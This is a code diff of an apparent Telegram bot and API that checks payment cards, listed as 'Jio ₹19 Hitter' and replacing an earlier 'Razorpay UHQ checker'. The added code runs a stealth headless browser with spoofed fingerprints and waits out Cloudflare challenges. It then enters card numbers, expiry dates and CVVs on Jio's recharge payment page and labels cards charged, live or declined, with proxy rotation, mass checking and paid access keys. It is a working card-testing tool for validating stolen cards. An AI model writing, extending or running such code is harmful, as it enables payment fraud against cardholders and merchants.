+    proxy_cfg = _parse_proxy_cfg(proxy)
+    browser = None; context = None
+    await _log("Init", "⚡")
 
     try:
-        file = await context.bot.get_file(doc.file_id)
-        lines = (await file.download_as_bytearray()).decode('utf-8', errors='ignore').splitlines()
-        cards = []
-        for line in lines:
-            line = line.strip()
-            if not line: continue
-            for sep in ["|", "/", " "]:
-                p = line.split(sep)
-                if len(p) >= 4:
-                    # Clean cc digits to prevent corruption
-                    c_num = ''.join(filter(str.isdigit, p[0]))
-                    if len(c_num) >= 12:
-                        cards.append((c_num, p[1].strip(), p[2].strip(), p[3].strip()))
-                        break
-    except Exception as e:
-        await status_msg.edit_text(f"⚠️ Error reading file: {e}")
-        return
+        async with async_playwright() as p:
+            launch_args = [
+                "--disable-blink-features=AutomationControlled",
+                "--disable-features=IsolateOrigins,site-per-process",
+                "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
+                "--no-first-run", "--no-default-browser-check",
+                "--disable-infobars", "--window-size=1920,1080",
+                "--start-maximized", "--lang=en-IN",
+            ]
+            await _log("Browser launching", "⏳")
+            browser = await p.chromium.launch(headless=headless, args=launch_args)
+            await _log("Browser ready", "✅")
 
-    total = len(cards)
-    start_time = time.time()
-    approved, charged, dead, errors = 0, 0, 0, 0
-    
-    current_proxy_status = "Connecting..."
-    current_api_status = "Initializing..."
-    current_gateway_response = "Waiting..."
-    username = f"@{update.effective_user.username}" if update.effective_user.username else "User"
-
-    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
-        masked_cc = f"{cc[:6]}******{cc[-4:]}" if len(cc) >= 10 else "************"
-        
-        async def update_screen(proxy_st, api_st, gw_resp):
-            nonlocal current_proxy_status, current_api_status, current_gateway_response
-            current_proxy_status = proxy_st
-            current_api_status = api_st
-            current_gateway_response = gw_resp
-            time_elapsed = int(time.time() - start_time)
-            
-            # Clean, wide, balanced UI Console Box layout
-            console_text = (
-                f"╔════════════════════════════════════╗\n"
-                f"║       🔥 RAZORPAY UHQ CHECKER      🔥      ║\n"
-                f"╠════════════════════════════════════╣\n"
-                f"║ 📊 Progress  : {idx}/{total:<19} ║\n"
-                f"║ 🛡️ Proxy IP  : {current_proxy_status:<19} ║\n"
-                f"║ 🔗 Step Flow : {current_api_status:<19} ║\n"
-                f"║ 💳 Card Proc : {masked_cc:<19} ║\n"
-                f"║ 💬 Gateway   : {current_gateway_response[:17]:<17} ║\n"
-                f"║ ⏱️ Elapsed   : {format_time(time_elapsed):<19} ║\n"
-                f"╠════════════════════════════════════╣\n"
-                f"║ ⭐ Appr: {approved:<5} | 💳 Chrg: {charged:<5}       ║\n"
-                f"║ ❌ Dead: {dead:<5}  | ⚠️ Err : {errors:<5}       ║\n"
-                f"╚════════════════════════════════════╝"
+            context = await browser.new_context(
+                user_agent=random.choice(UA_POOL),
+                viewport=random.choice(VIEWPORTS),
+                locale="en-IN", timezone_id="Asia/Kolkata",
+                geolocation={"latitude": 19.0760, "longitude": 72.8777},
+                permissions=["geolocation"], color_scheme="light",
+                device_scale_factor=1, is_mobile=False, has_touch=False,
+                java_script_enabled=True, proxy=proxy_cfg,
+                extra_http_headers={
+                    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
+                    "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
+                    "Sec-Ch-Ua-Mobile": "?0",
+                    "Sec-Ch-Ua-Platform": '"Windows"',
+                    "Upgrade-Insecure-Requests": "1",
+                },
             )
+            await context.add_init_script(STEALTH_JS)
+            await _log("Stealth injected", "✅")
+
+            page = await context.new_page()
+            await _log("Page created", "✅")
+
+            await _log("Opening jio.com", "⏳")
             try:
-                await status_msg.edit_text(f"```text\n{console_text}\n```", parse_mode="Markdown")
-            except:
-                pass
+                await page.goto("https://www.jio.com/", timeout=NAV_TIMEOUT,
+                                wait_until="domcontentloaded")
+                await _human_delay(1500, 3000)
+                await page.mouse.move(random.randint(300, 800), random.randint(200, 500))
+                await page.evaluate(f"window.scrollBy(0, {random.randint(100, 300)})")
+                await _human_delay(800, 1500)
+                await _log("jio.com loaded", "✅")
+            except Exception as e:
+                await _log(f"jio.com fail: {str(e)[:25]}", "⚠️")
 
-        while True:
-            await update_screen("Connecting...", "🌐 Hitting Site...", "Checking...")
-            res = await process_card_pipeline_with_logs(cc, mm, yy, cvv, status_callback=update_screen)
-            status, resp_msg, proxy_used = res["status"], res["response"], res["proxy"]
+            await _log("Opening recharge page", "⏳")
+            await page.goto(JIO_RECHARGE_URL, timeout=NAV_TIMEOUT,
+                            wait_until="domcontentloaded")
+            await _log("Recharge page loaded", "✅")
 
-            if status == "error":
-                errors += 1
-                await update_screen(f"({proxy_used})", "🔄 Net Error - Retrying", "Rechecking...")
-                await asyncio.sleep(1.0)
-                continue
-            
-            if status == "charged":
-                charged += 1
-                approved += 1
-            elif status == "approved":
-                approved += 1
-            elif status == "declined":
-                dead += 1
-            
-            break
+            await _log("Cloudflare check", "🔍")
+            cf_hit = False
+            for i in range(15):
+                title = (await page.title()).lower()
+                body = ""
+                try: body = (await page.inner_text("body")).lower()[:500]
+                except Exception: pass
+                if "just a moment" in title or "checking" in body or "verify you are human" in body:
+                    cf_hit = True
+                    await _log(f"CF challenge ({i+1}/15)", "🛡️")
+                    await asyncio.sleep(2)
+                else:
+                    break
+            await _log("Cloudflare passed" if cf_hit else "No Cloudflare", "✅")
 
-        if status in ["charged", "approved"]:
-            await update.message.reply_text(
-                f"◎  **{status.capitalize()} · Razorpay UHQ**\n"
-                f"━━━━━━━━━━━━━━━━━\n"
-                f"▸ num  · `{cc}|{mm}|{yy}|{cvv}`\n"
-                f"▸ gate · Razorpay Multi-Site\n"
-                f"▸ resp · {resp_msg}\n"
-                f"▸ user · {username}\n"
-                f"━━━━━━━━━━━━━━━━━\n"
-                f"▸ proxy· {proxy_used}",
-                parse_mode="Markdown"
-            )
+            await _log("Finding mobile field", "🔍")
+            try:
+                mf = page.locator(
+                    "input[type='tel'], input[name*='mobile' i], "
+                    "input[id*='mobile' i], input[placeholder*='mobile' i]"
+                ).first
+                await mf.wait_for(state="visible", timeout=10000)
+                await _log("Mobile field found", "✅")
+                await _human_type(mf, mobile)
+                await _log(f"Mobile: {mobile}", "✅")
+            except PWTimeout:
+                await _log("Mobile field NOT found", "❌")
+                result.update(status="error", response="Mobile field not found",
+                              code="PW-101", time=f"{(time.time()-start):.2f}s")
+                return result
 
-        await asyncio.sleep(0.3)
+            await _human_delay(1000, 2000)
 
-    final_text = (
-        f"╔════════════════════════════════════╗\n"
-        f"║ 🏁 CHECKING SESSION FINISHED 🏁    ║\n"
-        f"╠════════════════════════════════════╣\n"
-        f"║ 📊 Total Checked: {total:<19} ║\n"
-        f"║ ⭐ Approved    : {approved:<19} ║\n"
-        f"║ 💳 Charged     : {charged:<19} ║\n"
-        f"║ ❌ Dead        : {dead:<19} ║\n"
-        f"║ ⚠️ Errors      : {errors:<19} ║\n"
-        f"║ 🕒 Total Time  : {format_time(int(time.time() - start_time)):<19} ║\n"
-        f"╚════════════════════════════════════╝"
-    )
-    await status_msg.edit_text(f"```text\n{final_text}\n```", parse_mode="Markdown")
+            await _log("Searching ₹19 plan", "🔍")
+            try:
+                plan = page.locator("text=/₹\\s*19\\b/").first
+                await plan.wait_for(state="visible", timeout=10000)
+                await plan.click()
+                await _log("₹19 plan selected", "✅")
+            except PWTimeout:
+                await _log("₹19 plan NOT found", "❌")
+                result.update(status="error", response="₹19 plan not found",
+                              code="PW-102", time=f"{(time.time()-start):.2f}s")
+                return result
 
-async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.message or not update.message.text or update.message.text.startswith('/'):
-        return
+            await _human_delay(800, 1500)
 
-    if not RAW_PROXIES:
-        await update.message.reply_text("⚠️ Please add a proxy first using `/proxy` or `/proxyadd` before checking cards!", parse_mode="Markdown")
-        return
+            await _log("Clicking Proceed", "⏳")
+            for label in ["Recharge", "Proceed", "Pay", "Continue"]:
+                try:
+                    btn = page.locator(f"button:has-text('{label}')").first
+                    if await btn.is_visible(timeout=2000):
+                        await btn.click()
+                        await _log(f"'{label}' clicked", "✅")
+                        break
+                except Exception:
+                    continue
 
-    raw = update.message.text.strip()
-    parts = None
-    for sep in ["|", "/", " "]:
-        p = raw.split(sep)
-        if len(p) >= 4:
-            c_num = ''.join(filter(str.isdigit, p[0]))
-            if len(c_num) >= 12:
-                parts = (c_num, p[1].strip(), p[2].strip(), p[3].strip())
-                break
+            await _human_delay(3000, 5000)
 
-    if not parts: return
+            await _log("Waiting Juspay iframe", "⏳")
+            card_frame = None
+            for i in range(10):
+                for fr in page.frames:
+                    u = (fr.url or "").lower()
+                    if "juspay" in u or "checkout" in u or "pay" in u:
+                        card_frame = fr
+                        await _log(f"Juspay iframe ({i+1}/10)", "✅")
+                        break
+                if card_frame: break
+                await asyncio.sleep(1)
+            if not card_frame:
+                await _log("Iframe NOT found — main page", "⚠️")
+                card_frame = page
 
-    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-    username = f"@{update.effective_user.username}" if update.effective_user.username else "User"
+            await _log("Finding card fields", "🔍")
+            try:
+                cn = card_frame.locator(
+                    "input[name*='card_number' i], input[autocomplete='cc-number'], "
+                    "input[id*='cardNumber' i], input[placeholder*='card number' i]"
+                ).first
+                await cn.wait_for(state="visible", timeout=JUSPAY_TIMEOUT)
+                await _human_type(cn, cc)
+                await _log("Card number filled", "✅")
 
-    wait_msg = await update.message.reply_text(f"⏳ Processing single card persistently...", parse_mode="Markdown")
+                exp = card_frame.locator(
+                    "input[name*='expiry' i], input[autocomplete='cc-exp'], input[id*='expiry' i]"
+                ).first
+                await _human_type(exp, f"{mm}/{yy_f}")
+                await _log(f"Expiry: {mm}/{yy_f}", "✅")
 
-    async def single_update(p_st, a_st, g_resp):
+                cv = card_frame.locator(
+                    "input[name*='cvv' i], input[autocomplete='cc-csc'], input[id*='cvv' i]"
+                ).first
+                await _human_type(cv, cvv)
+                await _log("CVV filled", "✅")
+            except PWTimeout:
+                await _log("Card fields NOT found", "❌")
+                result.update(status="error", response="Card fields not found",
+                              code="PW-103", time=f"{(time.time()-start):.2f}s")
+                return result
+
+            await _human_delay(600, 1200)
+            await _log("Clicking Pay", "⏳")
+            try:
+                sub = card_frame.locator(
+                    "button:has-text('Pay'), button[type='submit'], button:has-text('Continue')"
+                ).first
+                await sub.click(timeout=8000)
+                await _log("Pay clicked", "✅")
+            except PWTimeout:
+                await _log("Pay NOT found", "⚠️")
+
+            await _log("Waiting response", "⏳")
+            await asyncio.sleep(6)
+
+            body_text = ""
+            for fr in page.frames:
+                try: body_text += (await fr.inner_text("body")) + "\n"
+                except Exception: pass
+
+            tl = body_text.lower()
+            result["time"] = f"{(time.time()-start):.2f}s"
+
+            if any(k in tl for k in ["otp", "one time password", "3d secure",
+                                      "enter otp", "verify", "authentication",
+                                      "securecode", "vbv", "challenge"]):
+                await _log("OTP screen detected", "🔐")
+                result.update(status="otp", response="OTP_REQUIRED (3DS)", code="PW-OTP")
+                return result
+
+            if any(k in tl for k in ["success", "payment successful",
+                                      "recharge successful", "thank you"]):
+                await _log("Payment SUCCESS", "💎")
+                result.update(status="charged", response="Payment Successful", code="TXN_SUCCESS")
+                return result
+
+            if any(k in tl for k in ["insufficient", "not enough", "limit exceeded", "balance low"]):
+                await _log("Card LIVE — insufficient", "✅")
+                result.update(status="approved", response="INSUFFICIENT_FUNDS (Card Live)", code="PW-LIVE")
+                return result
+
+            if any(k in tl for k in ["declined", "failed", "rejected",
+                                      "invalid card", "not authorized"]):
+                await _log("Card DECLINED", "❌")
+                result.update(status="declined", response="Declined", code="PW-DEC")
+                return result
+
+            await _log("Unknown response", "❓")
+            result.update(status="declined", response="Unknown response", code="PW-UNK")
+            return result
+
+    except Exception as e:
+        logger.warning(f"PW error: {str(e)[:80]}")
+        await _log(f"Error: {str(e)[:40]}", "⚠️")
+        result.update(status="error", response=f"PW_ERROR ({str(e)[:60]})",
+                      code="PW-500", time=f"{(time.time()-start):.2f}s")
+        return result
+    finally:
         try:
-            await wait_msg.edit_text(f"⚡ **Status:** Proxy: `{p_st}` | Flow: `{a_st}` | Resp: `{g_resp}`", parse_mode="Markdown")
-        except: pass
+            if context: await context.close()
+            if browser: await browser.close()
+        except Exception: pass
 
-    while True:
-        res = await process_card_pipeline_with_logs(cc, mm, yy, cvv, status_callback=single_update)
-        status, resp_msg, proxy_used = res["status"], res["response"], res["proxy"]
-        if status != "error":
-            break
-        await asyncio.sleep(1.0)
+# ═══════════════════════════════════════════════════════════
+# LIVE LOGGER
+# ═══════════════════════════════════════════════════════════
+class LiveLogger:
+    def __init__(self, bot, chat_id, card_masked, proxy, max_lines=15,
+                 min_edit_interval=1.5):
+        self.bot = bot; self.chat_id = chat_id; self.card = card_masked
+        self.proxy = proxy; self.max_lines = max_lines
+        self.min_edit_interval = min_edit_interval
+        self.lines = []; self.msg = None; self.start = time.time()
+        self._last_edit = 0.0; self._lock = asyncio.Lock(); self._pending = False
 
-    if status in ["charged", "approved"]:
-        reply = (
-            f"◎  **{status.capitalize()} · Razorpay UHQ**\n"
-            f"━━━━━━━━━━━━━━━━━\n"
-            f"▸ num  · `{cc}|{mm}|{yy}|{cvv}`\n"
-            f"▸ gate · Razorpay Multi-Site\n"
-            f"▸ resp · {resp_msg}\n"
-            f"▸ user · {username}\n"
-            f"━━━━━━━━━━━━━━━━━\n"
-            f"▸ proxy· {proxy_used}"
+    def _render(self, status_line=""):
+        elapsed = f"{time.time()-self.start:.1f}s"
+        header = (
+            f"╔══════════════════════════════════╗\n"
+            f"║  📱 JIO ₹19 — LIVE CHECK 💎\n"
+            f"╠══════════════════════════════════╣\n"
+            f"║  💳 {self.card}\n"
+            f"║  🌐 {self.proxy}\n"
+            f"║  ⏱️  {elapsed}\n"
+            f"╠══════════════════════════════════╣\n"
+            f"║  📋 LOGS\n"
         )
-        await wait_msg.edit_text(reply, parse_mode="Markdown")
-    else:
-        await wait_msg.edit_text(f"ⓧ **Declined / Dead**\n▸ num: `{cc}|{mm}|{yy}|{cvv}`\n▸ resp: {resp_msg}", parse_mode="Markdown")
+        shown = self.lines[-self.max_lines:]
+        log_block = ""
+        for emoji, ts, msg in shown:
+            log_block += f"║  {emoji} {ts} {msg[:28]}\n"
+        footer = ""
+        if status_line:
+            footer = f"╠══════════════════════════════════╣\n║  {status_line}\n"
+        footer += "╚══════════════════════════════════╝"
+        return f"```\n{header}{log_block}{footer}\n```"
 
-def run_fastapi_server():
-    port = int(os.getenv("PORT", 7070))
-    uvicorn.run(api_app, host="0.0.0.0", port=port, log_level="warning")
+    async def log(self, msg, emoji="⏳", ts=None):
+        async with self._lock:
+            ts = ts or f"{time.time()-self.start:.1f}s"
+            self.lines.append((emoji, ts, msg))
+            now = time.time()
+            if now - self._last_edit < self.min_edit_interval:
+                self._pending = True; return
+            self._last_edit = now; self._pending = False
+            await self._flush()
 
-def main():
-    server_thread = Thread(target=run_fastapi_server, daemon=True)
-    server_thread.start()
+    async def _flush(self):
+        text = self._render()
+        try:
+            if self.msg is None:
+                self.msg = await self.bot.send_message(self.chat_id, text, parse_mode="Markdown")
+            else:
+                await self.msg.edit_text(text, parse_mode="Markdown")
+        except Exception as e:
+            logger.warning(f"LiveLogger edit fail: {str(e)[:60]}")
 
-    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start_cmd))
-    app.add_handler(CommandHandler("proxy", proxy_cmd))
-    app.add_handler(CommandHandler("proxyadd", proxyadd_cmd))
-    app.add_handler(CommandHandler("myproxy", myproxy_cmd))
-    app.add_handler(CommandHandler("rmproxy", rmproxy_cmd))
-    app.add_handler(CommandHandler("msa", msa_cmd))
-    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_single_card))
-    
-    logger.info("Starting Razorpay CC Checker Bot + API Engine...")
-    app.run_polling()
+    async def finish(self, status, response, code):
+        emoji_map = {
+            "charged": "💎 CHARGED", "approved": "✅ APPROVED (LIVE)",
+            "declined": "❌ DECLINED", "dead": "☠️ DEAD",
+            "otp": "🔐 OTP — SKIPPED", "error": "⚠️ ERROR", "skip": "⏭️ SKIPPED",
+        }
+        status_line = f"{emoji_map.get(status, status.upper())} · {code}"
+        async with self._lock:
+            self.lines.append(("🏁", f"{time.time()-self.start:.1f}s",
+                               f"Done: {response[:30]}"))
+            self._last_edit = time.time()
+            text = self._render(status_line=status_line)
+            try:
+                if self.msg is None:
+                    self.msg = await self.bot.send_message(self.chat_id, text, parse_mode="Markdown")
+                else:
+                    await self.msg.edit_text(text, parse_mode="Markdown")
+            except Exception as e:
+                logger.warning(f"LiveLogger finish edit fail: {str(e)[:60]}")
 
-if __name__ == "__main__":
-    main()
+# ═══════════════════════════════════════════════════════════
+# API
+# ═══════════════════════════════════════════════════════════
+class Jio19Request(BaseModel):
+    cc:str; mm:str; yy:str; cvv:str; mobile:str=""; user_id:int=0
+
+@api_app.post("/api/jio19")
+async def api_jio19(req: Jio19Request):
+    if req.user_id and not has_access(req.user_id):
+        raise HTTPException(403, "No active key")
+    if req.user_id and not consume_cc(req.user_id):
+        raise HTTPException(429, "CC limit reached")
+    proxy = get_proxy()
+    r = await jio19_playwright(req.cc, req.mm, req.yy, req.cvv,
+                                mobile=req.mobile, proxy=proxy)
+    if req.user_id:
+        bump_live(req.user_id)
+        if r["status"] in ("charged","approved"): bump_hit()
+        elif r["status"] == "otp": bump_otp()
+    return r
+
+@api_app.get("/")
+async def api_root():
+    return {"status": "ok", "bot": BOT_NAME, "owner": OWNER_HANDLE}
+
+# ═══════════════════════════════════════════════════════════
+# UI HELPERS
+# ═══════════════════════════════════════════════════════════
+def fmt_time(s):
+    m, sec = divmod(int(s), 60)
+    return f"{m}m {sec}s" if m else f"{sec}s"
+
+def main_menu_kb(uid):
+    rows = [
+        [InlineKeyboardButton("📱 Jio ₹19 Hitter", callback_data="ui_jio19")],
+        [InlineKeyboardButton("📂 Mass Check (.txt)", callback_data="ui_chk"),
+         InlineKeyboardButton("📊 Live Stats", callback_data="ui_stats")],
+        [InlineKeyboardButton("💎 My Account", callback_data="ui_info"),
+         InlineKeyboardButton("🔑 Redeem Key", callback_data="ui_redeem")],
+        [InlineKeyboardButton("💬 Feedback", callback_data="ui_fb"),
+         InlineKeyboardButton("📖 Help", callback_data="ui_help")],
+    ]
+    if uid == OWNER_ID or is_admin(uid):
+        rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="ui_admin")])
+    return InlineKeyboardMarkup(rows)
+
+def admin_menu_kb():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔑 Gen Key", callback_data="ad_genkey"),
+         InlineKeyboardButton("📊 Bot Stats", callback_data="ad_stats")],
+        [InlineKeyboardButton("👥 Users", callback_data="ad_users"),
+         InlineKeyboardButton("📩 Feedback", callback_data="ad_fb")],
+        [InlineKeyboardButton("⬅️ Back", callback_data="ui_main")],
+    ])
+
+def back_kb(target="ui_main", label="⬅️ Back"):
+    return InlineKeyboardMarkup([[InlineKeyboardButton(label, callback_data=target)]])
+
+def user_card(u, uid):
+    live = u["live_checks"] if u else 0
+    life = u["lifetime"] if u else 0
+    kd = key_days_left(uid); cl = cc_limit_left(uid); k = get_active_key(uid)
+    used = k["cc_used"] if k else 0; lim = k["cc_limit"] if k else 0
+    role = u['role'] if u else 'guest'
+    role_emoji = {"owner": "👑", "admin": "⭐", "user": "👤"}.get(role, "👤")
+    return (
+        f"╔══════════════════════════════════╗\n"
+        f"║
